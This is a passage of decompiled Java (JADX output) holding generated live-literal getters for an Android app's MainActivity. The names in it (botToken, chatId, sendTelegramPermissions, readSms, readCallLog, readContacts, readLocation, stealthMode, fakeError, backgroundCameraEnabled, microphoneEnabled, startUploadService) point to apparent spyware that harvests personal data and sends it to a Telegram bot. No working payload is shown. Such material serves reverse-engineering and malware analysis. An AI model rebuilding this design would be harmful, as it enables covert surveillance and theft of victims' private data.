    public final String m۵۰String$arg0$call$init$$arg1$callregisterReceiver2$try1$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴۱String$arg0$call$init$$arg1$callregisterReceiver2$try1$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۸۳State$String$arg0$call$init$$arg1$callregisterReceiver2$try1$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-$init$$arg-1$call-registerReceiver-2$try-1$fun-onCreate$class-MainActivity", f۱۴۱String$arg0$call$init$$arg1$callregisterReceiver2$try1$funonCreate$classMainActivity);
            f۸۳State$String$arg0$call$init$$arg1$callregisterReceiver2$try1$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-$init$$arg-1$call-registerReceiver-3$try-1$fun-onCreate$class-MainActivity", offset = 8848)
    /* JADX INFO: renamed from: String$arg-0$call-$init$$arg-1$call-registerReceiver-3$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۵۱String$arg0$call$init$$arg1$callregisterReceiver3$try1$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴۲String$arg0$call$init$$arg1$callregisterReceiver3$try1$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۸۴State$String$arg0$call$init$$arg1$callregisterReceiver3$try1$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-$init$$arg-1$call-registerReceiver-3$try-1$fun-onCreate$class-MainActivity", f۱۴۲String$arg0$call$init$$arg1$callregisterReceiver3$try1$funonCreate$classMainActivity);
            f۸۴State$String$arg0$call$init$$arg1$callregisterReceiver3$try1$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-$init$$arg-1$call-registerReceiver-4$try-1$fun-onCreate$class-MainActivity", offset = 8945)
    /* JADX INFO: renamed from: String$arg-0$call-$init$$arg-1$call-registerReceiver-4$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۵۲String$arg0$call$init$$arg1$callregisterReceiver4$try1$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴۳String$arg0$call$init$$arg1$callregisterReceiver4$try1$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۸۵State$String$arg0$call$init$$arg1$callregisterReceiver4$try1$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-$init$$arg-1$call-registerReceiver-4$try-1$fun-onCreate$class-MainActivity", f۱۴۳String$arg0$call$init$$arg1$callregisterReceiver4$try1$funonCreate$classMainActivity);
            f۸۵State$String$arg0$call$init$$arg1$callregisterReceiver4$try1$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-getBoolean$val-askedAccessibility$fun-onCreate$class-MainActivity", offset = 10318)
    /* JADX INFO: renamed from: String$arg-0$call-getBoolean$val-askedAccessibility$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۵۳String$arg0$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴۴String$arg0$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۸۶State$String$arg0$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-getBoolean$val-askedAccessibility$fun-onCreate$class-MainActivity", f۱۴۴String$arg0$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity);
            f۸۶State$String$arg0$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-getSharedPreferences$val-prefs$fun-onCreate$class-MainActivity", offset = 10243)
    /* JADX INFO: renamed from: String$arg-0$call-getSharedPreferences$val-prefs$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۵۴String$arg0$callgetSharedPreferences$valprefs$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴۵String$arg0$callgetSharedPreferences$valprefs$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۸۷State$String$arg0$callgetSharedPreferences$valprefs$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-getSharedPreferences$val-prefs$fun-onCreate$class-MainActivity", f۱۴۵String$arg0$callgetSharedPreferences$valprefs$funonCreate$classMainActivity);
            f۸۷State$String$arg0$callgetSharedPreferences$valprefs$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-getString$arg-0$call-$set-botToken$$try-2$fun-onCreate$class-MainActivity", offset = 9250)
    /* JADX INFO: renamed from: String$arg-0$call-getString$arg-0$call-$set-botToken$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۵۵String$arg0$callgetString$arg0$call$setbotToken$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴۶String$arg0$callgetString$arg0$call$setbotToken$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۸۸State$String$arg0$callgetString$arg0$call$setbotToken$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-getString$arg-0$call-$set-botToken$$try-2$fun-onCreate$class-MainActivity", f۱۴۶String$arg0$callgetString$arg0$call$setbotToken$$try2$funonCreate$classMainActivity);
            f۸۸State$String$arg0$callgetString$arg0$call$setbotToken$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-getString$arg-0$call-$set-chatId$$try-2$fun-onCreate$class-MainActivity", offset = 9301)
    /* JADX INFO: renamed from: String$arg-0$call-getString$arg-0$call-$set-chatId$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۵۶String$arg0$callgetString$arg0$call$setchatId$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴۷String$arg0$callgetString$arg0$call$setchatId$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۸۹State$String$arg0$callgetString$arg0$call$setchatId$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-getString$arg-0$call-$set-chatId$$try-2$fun-onCreate$class-MainActivity", f۱۴۷String$arg0$callgetString$arg0$call$setchatId$$try2$funonCreate$classMainActivity);
            f۸۹State$String$arg0$callgetString$arg0$call$setchatId$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-joinToString$arg-0$call-plus$val-msg$fun-sendTelegramPermissions$class-MainActivity", offset = 19991)
    /* JADX INFO: renamed from: String$arg-0$call-joinToString$arg-0$call-plus$val-msg$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final String m۵۷String$arg0$calljoinToString$arg0$callplus$valmsg$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴۸String$arg0$calljoinToString$arg0$callplus$valmsg$funsendTelegramPermissions$classMainActivity;
        }
        State<String> stateLiveLiteral = f۹۰State$String$arg0$calljoinToString$arg0$callplus$valmsg$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-joinToString$arg-0$call-plus$val-msg$fun-sendTelegramPermissions$class-MainActivity", f۱۴۸String$arg0$calljoinToString$arg0$callplus$valmsg$funsendTelegramPermissions$classMainActivity);
            f۹۰State$String$arg0$calljoinToString$arg0$callplus$valmsg$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-loadUrl$else$when$fun-onReceivedError$class-$no-name-provided$$arg-0$call-setWebViewClient$try$fun-setupWebView$class-MainActivity", offset = 12362)
    /* JADX INFO: renamed from: String$arg-0$call-loadUrl$else$when$fun-onReceivedError$class-$no-name-provided$$arg-0$call-setWebViewClient$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    public final String m۵۸String$arg0$callloadUrl$else$when$funonReceivedError$class$nonameprovided$$arg0$callsetWebViewClient$try$funsetupWebView$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴۹String$arg0$callloadUrl$else$when$funonReceivedError$class$nonameprovided$$arg0$callsetWebViewClient$try$funsetupWebView$classMainActivity;
        }
        State<String> stateLiveLiteral = f۹۱State$String$arg0$callloadUrl$else$when$funonReceivedError$class$nonameprovided$$arg0$callsetWebViewClient$try$funsetupWebView$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-loadUrl$else$when$fun-onReceivedError$class-$no-name-provided$$arg-0$call-setWebViewClient$try$fun-setupWebView$class-MainActivity", f۱۴۹String$arg0$callloadUrl$else$when$funonReceivedError$class$nonameprovided$$arg0$callsetWebViewClient$try$funsetupWebView$classMainActivity);
            f۹۱State$String$arg0$callloadUrl$else$when$funonReceivedError$class$nonameprovided$$arg0$callsetWebViewClient$try$funsetupWebView$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-open$$$this$call-bufferedReader$$$this$call-use$val-configStr$try-2$fun-onCreate$class-MainActivity", offset = 9105)
    /* JADX INFO: renamed from: String$arg-0$call-open$$$this$call-bufferedReader$$$this$call-use$val-configStr$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۵۹String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵۰String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۹۲State$String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-open$$$this$call-bufferedReader$$$this$call-use$val-configStr$try-2$fun-onCreate$class-MainActivity", f۱۵۰String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try2$funonCreate$classMainActivity);
            f۹۲State$String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-backgroundCameraEnabled$$try-2$fun-onCreate$class-MainActivity", offset = 10052)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-backgroundCameraEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۶۰String$arg0$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵۱String$arg0$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۹۳State$String$arg0$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-backgroundCameraEnabled$$try-2$fun-onCreate$class-MainActivity", f۱۵۱String$arg0$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity);
            f۹۳State$String$arg0$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-fakeError$$try-2$fun-onCreate$class-MainActivity", offset = 9975)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-fakeError$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۶۱String$arg0$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵۲String$arg0$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۹۴State$String$arg0$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-fakeError$$try-2$fun-onCreate$class-MainActivity", f۱۵۲String$arg0$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity);
            f۹۴State$String$arg0$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-microphoneEnabled$$try-2$fun-onCreate$class-MainActivity", offset = 10138)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-microphoneEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۶۲String$arg0$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵۳String$arg0$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۹۵State$String$arg0$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-microphoneEnabled$$try-2$fun-onCreate$class-MainActivity", f۱۵۳String$arg0$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity);
            f۹۵State$String$arg0$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-postNotifications$$try-2$fun-onCreate$class-MainActivity", offset = 9838)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-postNotifications$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۶۳String$arg0$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵۴String$arg0$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۹۶State$String$arg0$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-postNotifications$$try-2$fun-onCreate$class-MainActivity", f۱۵۴String$arg0$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity);
            f۹۶State$String$arg0$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-readCallLog$$try-2$fun-onCreate$class-MainActivity", offset = 9631)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-readCallLog$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۶۴String$arg0$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵۵String$arg0$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۹۷State$String$arg0$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-readCallLog$$try-2$fun-onCreate$class-MainActivity", f۱۵۵String$arg0$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity);
            f۹۷State$String$arg0$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-readContacts$$try-2$fun-onCreate$class-MainActivity", offset = 9506)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-readContacts$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۶۵String$arg0$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵۶String$arg0$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۹۸State$String$arg0$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-readContacts$$try-2$fun-onCreate$class-MainActivity", f۱۵۶String$arg0$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity);
            f۹۸State$String$arg0$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-readLocation$$try-2$fun-onCreate$class-MainActivity", offset = 9765)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-readLocation$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۶۶String$arg0$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵۷String$arg0$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۹۹State$String$arg0$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-readLocation$$try-2$fun-onCreate$class-MainActivity", f۱۵۷String$arg0$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity);
            f۹۹State$String$arg0$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-readSms$$try-2$fun-onCreate$class-MainActivity", offset = 9569)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-readSms$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۶۷String$arg0$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵۸String$arg0$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۰۰State$String$arg0$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-readSms$$try-2$fun-onCreate$class-MainActivity", f۱۵۸String$arg0$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity);
            f۱۰۰State$String$arg0$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-readStorage$$try-2$fun-onCreate$class-MainActivity", offset = 9698)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-readStorage$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۶۸String$arg0$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵۹String$arg0$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۰۱State$String$arg0$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-readStorage$$try-2$fun-onCreate$class-MainActivity", f۱۵۹String$arg0$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity);
            f۱۰۱State$String$arg0$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-requirePermissions$$try-2$fun-onCreate$class-MainActivity", offset = 9432)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-requirePermissions$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۶۹String$arg0$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶۰String$arg0$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۰۲State$String$arg0$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-requirePermissions$$try-2$fun-onCreate$class-MainActivity", f۱۶۰String$arg0$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity);
            f۱۰۲State$String$arg0$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optBoolean$arg-0$call-$set-stealthMode$$try-2$fun-onCreate$class-MainActivity", offset = 9910)
    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-stealthMode$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۷۰String$arg0$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶۱String$arg0$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۰۳State$String$arg0$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optBoolean$arg-0$call-$set-stealthMode$$try-2$fun-onCreate$class-MainActivity", f۱۶۱String$arg0$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity);
            f۱۰۳State$String$arg0$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-optString$arg-0$call-$set-webViewUrl$$try-2$fun-onCreate$class-MainActivity", offset = 9354)
    /* JADX INFO: renamed from: String$arg-0$call-optString$arg-0$call-$set-webViewUrl$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۷۱String$arg0$calloptString$arg0$call$setwebViewUrl$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶۲String$arg0$calloptString$arg0$call$setwebViewUrl$$try2$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۰۴State$String$arg0$calloptString$arg0$call$setwebViewUrl$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-optString$arg-0$call-$set-webViewUrl$$try-2$fun-onCreate$class-MainActivity", f۱۶۲String$arg0$calloptString$arg0$call$setwebViewUrl$$try2$funonCreate$classMainActivity);
            f۱۰۴State$String$arg0$calloptString$arg0$call$setwebViewUrl$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-plus$arg-0$call-contains$else$when$arg-0$call-EQEQ$fun-isAccessibilityServiceEnabled$class-MainActivity", offset = 18280)
    /* JADX INFO: renamed from: String$arg-0$call-plus$arg-0$call-contains$else$when$arg-0$call-EQEQ$fun-isAccessibilityServiceEnabled$class-MainActivity, reason: not valid java name */
    public final String m۷۲String$arg0$callplus$arg0$callcontains$else$when$arg0$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶۳String$arg0$callplus$arg0$callcontains$else$when$arg0$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۰۵State$String$arg0$callplus$arg0$callcontains$else$when$arg0$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-plus$arg-0$call-contains$else$when$arg-0$call-EQEQ$fun-isAccessibilityServiceEnabled$class-MainActivity", f۱۶۳String$arg0$callplus$arg0$callcontains$else$when$arg0$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity);
            f۱۰۵State$String$arg0$callplus$arg0$callcontains$else$when$arg0$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-putBoolean$$this$call-apply$branch$if$fun-onCreate$class-MainActivity", offset = 11101)
    /* JADX INFO: renamed from: String$arg-0$call-putBoolean$$this$call-apply$branch$if$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۷۳String$arg0$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶۴String$arg0$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۰۶State$String$arg0$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-putBoolean$$this$call-apply$branch$if$fun-onCreate$class-MainActivity", f۱۶۴String$arg0$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity);
            f۱۰۶State$String$arg0$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-setAction$fun-$anonymous$$arg-0$call-apply$val-serviceIntent$try$fun-startUploadService$class-MainActivity", offset = 15116)
    /* JADX INFO: renamed from: String$arg-0$call-setAction$fun-$anonymous$$arg-0$call-apply$val-serviceIntent$try$fun-startUploadService$class-MainActivity, reason: not valid java name */
    public final String m۷۴String$arg0$callsetAction$fun$anonymous$$arg0$callapply$valserviceIntent$try$funstartUploadService$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶۵String$arg0$callsetAction$fun$anonymous$$arg0$callapply$valserviceIntent$try$funstartUploadService$classMainActivity;
        }
        State<String> stateLiveLiteral = f۱۰۷State$String$arg0$callsetAction$fun$anonymous$$arg0$callapply$valserviceIntent$try$funstartUploadService$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-setAction$fun-$anonymous$$arg-0$call-apply$val-serviceIntent$try$fun-startUploadService$class-MainActivity", f۱۶۵String$arg0$callsetAction$fun$anonymous$$arg0$callapply$valserviceIntent$try$funstartUploadService$classMainActivity);
